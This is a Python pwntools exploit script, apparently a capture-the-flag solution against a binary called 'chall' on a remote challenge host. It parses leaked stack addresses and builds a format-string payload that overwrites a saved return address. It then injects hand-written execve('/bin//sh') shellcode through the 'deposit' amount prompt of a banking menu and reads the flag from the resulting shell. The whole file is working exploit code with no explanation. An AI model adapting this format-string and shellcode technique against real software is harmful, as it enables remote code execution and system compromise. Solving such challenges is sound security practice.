from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("tjc.tf", 31363)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b""
line = io.recvline()
d1 = int(line.split(b",")[0], 16)
d2 = int(line.split(b",")[1], 16)

log.success(hex(d1))
log.success(hex(d2))

ret_addr_ptr = d1 + 0x418

log.success("ret:-----> " + hex(ret_addr_ptr))


shellcode_addr = d1 + 0x80

fmt_str = fmtstr_payload(12, {ret_addr_ptr: shellcode_addr}, 0, write_size="byte")
shellcode = b""
shellcode += asm("xor rsi, rsi")
shellcode += asm("push rsi")
shellcode += asm("mov rdi, 0x68732f2f6e69622f")  # /bin//sh
shellcode += asm("push rdi")
shellcode += asm("push rsp")
shellcode += asm("pop rdi")
shellcode += asm("push 59")
shellcode += asm("pop rax")
shellcode += asm("cdq")              # rdx=0
shellcode += asm("syscall")

ddebug("breakrva 0x0134f\ncontinue")
io.sendlineafter("ithdraw|transfer|exit) ", "deposit")

payload = fmt_str.ljust(0x80, b"a")
payload += shellcode

io.sendlineafter("Enter amount: ", payload)
io.sendlineafter("ithdraw|transfer|exit) ", "exit")
io.sendline(b"cat flag*")
io.interactive()
